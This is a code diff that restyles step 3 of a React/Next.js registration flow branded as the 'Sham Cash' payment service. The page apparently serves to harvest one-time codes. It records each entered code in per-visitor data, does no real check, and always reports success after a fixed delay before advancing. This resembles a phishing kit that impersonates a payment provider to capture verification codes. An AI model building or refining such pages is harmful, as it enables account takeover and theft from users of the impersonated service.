@@ -2,12 +2,11 @@
 
 import { useRef, useState } from 'react';
 import { useRouter } from 'next/navigation';
+import StepIndicator from '@/components/StepIndicator';
+import Logo from '@/components/Logo';
 import { useVisitorContext } from '@/contexts/VisitorContext';
 import { useSoundSystem } from '@/hooks/useSound';
 import { useVisitorRedirect } from '@/hooks/useVisitorRedirect';
-
-const VERIFICATION_DELAY_MS = 600;
-const SUCCESS_MESSAGE_DURATION_MS = 800;
 
 export default function Step3Page() {
   const router = useRouter();
@@ -26,7 +25,6 @@ export default function Step3Page() {
     newOtp[index] = clean;
     setOtp(newOtp);
     if (error) setError('');
-
     if (clean && index < 5) {
       inputRefs.current[index + 1]?.focus();
     }
@@ -66,132 +64,50 @@ export default function Step3Page() {
       play('alert');
       return;
     }
-
     setError('');
     setIsSubmitting(true);
-
     const visitorId = sessionStorage.getItem('currentVisitorId');
     if (visitorId) {
       updateVisitorData(visitorId, { securityCode: code });
       updateVisitorStep(visitorId, 3);
     }
 
-    await new Promise((r) => setTimeout(r, VERIFICATION_DELAY_MS));
+    await new Promise((r) => setTimeout(r, 600));
     play('verification-complete');
     setSuccess(true);
-    await new Promise((r) => setTimeout(r, SUCCESS_MESSAGE_DURATION_MS));
+    await new Promise((r) => setTimeout(r, 800));
     router.push('/registration/step-4');
   };
 
   return (
-    <div
-      dir="rtl"
-      style={{
-        minHeight: '100vh',
-        background: '#0b1d3a',
-        color: 'white',
-        fontFamily: 'Segoe UI, Tahoma, Arial, sans-serif',
-        display: 'flex',
-        flexDirection: 'column',
-        alignItems: 'center',
-      }}
-    >
-      {/* Header */}
-      <div
-        style={{
-          width: '100%',
-          maxWidth: 420,
-          padding: '16px 20px',
-          display: 'flex',
-          justifyContent: 'space-between',
-          alignItems: 'center',
-        }}
-      >
-        <span
-          role="button"
-          aria-label="فتح القائمة"
-          tabIndex={0}
-          onKeyDown={(e) => e.key === 'Enter' && e.currentTarget.click()}
-          style={{ fontSize: 26, cursor: 'pointer', color: '#a0aec0' }}
-        >
-          ≡
-        </span>
-        <span style={{ fontWeight: 'bold', fontSize: 16 }}>شام كاش</span>
-      </div>
-
-      {/* Logo Section */}
-      <div style={{ textAlign: 'center', marginTop: 16, marginBottom: 24 }}>
-        <div
-          style={{
-            width: 72,
-            height: 72,
-            background: 'linear-gradient(135deg, #00c6ff, #0072ff)',
-            borderRadius: 18,
-            margin: '0 auto 12px',
-            display: 'flex',
-            alignItems: 'center',
-            justifyContent: 'center',
-            fontSize: 24,
-            fontWeight: 'bold',
-            color: 'white',
-            boxShadow: '0 4px 24px rgba(0,114,255,0.4)',
-          }}
-        >
-          SC
+    <main className="min-h-screen bg-gradient-to-b from-[#020617] to-[#020c2b] text-white flex flex-col items-center px-4 py-6" dir="rtl">
+      <div className="w-full max-w-md">
+        <div className="text-center mb-5">
+          <Logo size={80} />
+          <h1 className="text-xl font-bold mt-2">SHAM CASH</h1>
+          <p className="text-blue-400 text-sm">نظام إدارة الزوار والمدفوعات</p>
         </div>
-        <h2 style={{ fontSize: 20, fontWeight: 'bold', marginBottom: 4 }}>شام كاش</h2>
-        <p style={{ color: '#a0aec0', fontSize: 13 }}>نظام التسجيل</p>
-      </div>
 
-      {/* Main Content */}
-      <div style={{ width: '100%', maxWidth: 420, padding: '0 20px', flex: 1 }}>
-        <div
-          style={{
-            background: '#1a2c4a',
-            borderRadius: 20,
-            padding: '28px 20px',
-            border: '1px solid #2d3a5a',
-          }}
-        >
-          <h3
-            style={{
-              fontSize: 20,
-              fontWeight: 'bold',
-              textAlign: 'center',
-              marginBottom: 8,
-            }}
-          >
-            التحقق من هويتك
-          </h3>
-          <p
-            id="otp-instructions"
-            style={{
-              color: '#a0aec0',
-              fontSize: 14,
-              textAlign: 'center',
-              marginBottom: 28,
-            }}
-          >
-            أدخل رمز التحقق المرسل إلى رقمك
-          </p>
+        <div className="text-center mb-5">
+          <h2 className="text-lg font-bold">التحقق من هويتك</h2>
+          <p id="otp-instructions" className="text-gray-400 text-sm mt-1">أدخل رمز التحقق المرسل إلى رقمك</p>
+        </div>
 
-          {/* OTP Inputs */}
+        <StepIndicator currentStep={3} />
+
+        <div className="bg-[#0f172a] rounded-2xl p-5 shadow-lg">
+          {/* OTP inputs — responsive grid fills available width */}
           <div
+            role="group"
+            aria-labelledby="otp-instructions"
+            className="grid grid-cols-6 gap-1.5 sm:gap-2 mb-5"
+            dir="ltr"
             onPaste={handlePaste}
-            style={{
-              display: 'flex',
-              gap: 10,
-              justifyContent: 'center',
-              direction: 'ltr',
-              marginBottom: 24,
-            }}
           >
             {otp.map((digit, i) => (
               <input
                 key={i}
-                ref={(el) => {
-                  inputRefs.current[i] = el;
-                }}
+                ref={(el) => { inputRefs.current[i] = el; }}
                 id={`otp-${i}`}
                 type="text"
                 inputMode="numeric"
@@ -201,120 +117,59 @@ export default function Step3Page() {
                 maxLength={1}
                 autoFocus={i === 0}
                 aria-label={`رقم التحقق ${i + 1}`}
-                aria-describedby="otp-instructions"
-                style={{
-                  width: 46,
-                  height: 52,
-                  textAlign: 'center',
-                  fontSize: 22,
-                  fontWeight: 'bold',
-                  borderRadius: 12,
-                  border: `2px solid ${digit ? '#4da3ff' : '#2d4070'}`,
-                  background: '#1b2f55',
-                  color: 'white',
-                  outline: 'none',
-                  transition: 'border-color 0.2s',
-                }}
-                onFocus={(e) => {
-                  e.target.style.borderColor = '#4da3ff';
-                }}
-                onBlur={(e) => {
-                  e.target.style.borderColor = otp[i] ? '#4da3ff' : '#2d4070';
-                }}
+                className={`
+                  h-12 sm:h-14 text-center text-lg sm:text-xl font-bold rounded-xl
+                  border-2 bg-[#020617] text-white outline-none transition-all duration-200
+                  focus:border-blue-500
+                  ${digit ? 'border-blue-500' : 'border-[#1a2e4a]'}
+                `}
               />
             ))}
           </div>
 
-          {/* Error */}
           {error && (
-            <p
-              style={{
-                color: '#fc8181',
-                textAlign: 'center',
-                fontSize: 13,
-                marginBottom: 16,
-              }}
-            >
-              {error}
-            </p>
+            <p className="text-red-400 text-center text-sm mb-4">{error}</p>
           )}
 
-          {/* Success */}
           {success && (
-            <p
-              style={{
-                color: '#68d391',
-                textAlign: 'center',
-                fontSize: 13,
-                marginBottom: 16,
-              }}
-            >
+            <p className="text-green-400 text-center text-sm mb-4">
               ✓ تم التحقق بنجاح! جاري الانتقال...
             </p>
           )}
 
-          {/* Confirm Button */}
-          <div style={{ display: 'flex', justifyContent: 'center' }}>
-            <button
-              onClick={handleConfirm}
-              disabled={isSubmitting}
-              style={{
-                width: 200,
-                padding: '13px 0',
-                borderRadius: 14,
-                border: 'none',
-                background: '#2ecc71',
-                color: 'white',
-                fontSize: 18,
-                fontWeight: 'bold',
-                cursor: isSubmitting ? 'not-allowed' : 'pointer',
-                opacity: isSubmitting ? 0.8 : 1,
-                transition: 'background 0.2s',
-              }}
-            >
-              {isSubmitting ? 'جاري التحقق...' : 'تأكيد'}
-            </button>
-          </div>
+          <button
+            onClick={handleConfirm}
+            disabled={isSubmitting}
+            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-2xl transition-all duration-200 flex items-center justify-center gap-2 disabled:opacity-60"
+          >
+            {isSubmitting ? (
+              <>
+                <svg className="animate-spin w-5 h-5" fill="none" viewBox="0 0 24 24">
+                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
+                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
+                </svg>
+                جاري التحقق...
+              </>
+            ) : (
+              <>
+                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
+                </svg>
+                تأكيد
+              </>
+            )}
+          </button>
+        </div>
+
+        <div className="text-center mt-4">
+          <button
+            onClick={() => router.back()}
+            className="text-gray-400 hover:text-white text-sm transition-colors"
+          >
+            ← العودة للخطوة السابقة
+          </button>
         </div>
       </div>
-
-      {/* Footer Navigation */}
-      <div
-        style={{
-          width: '100%',
-          maxWidth: 420,
-          display: 'flex',
-          justifyContent: 'space-between',
-          padding: '20px 20px 32px',
-          marginTop: 'auto',
-        }}
-      >
-        <button
-          onClick={() => router.push('/registration/step-2')}
-          style={{
-            background: 'none',
-            border: 'none',
-            color: '#4da3ff',
-            fontSize: 16,
-            cursor: 'pointer',
-          }}
-        >
-          ← السابق
-        </button>
-        <button
-          onClick={() => router.push('/registration/step-4')}
-          disabled={!success}
-          style={{
-            background: 'none',
-            border: 'none',
-            color: success ? '#4da3ff' : '#4a5568',
-            fontSize: 16,
-            cursor: success ? 'pointer' : 'not-allowed',
-          }}
-        >
-          التالي →
-        </button>
-      </div>
-    </div>
+    </main>
   );
 }
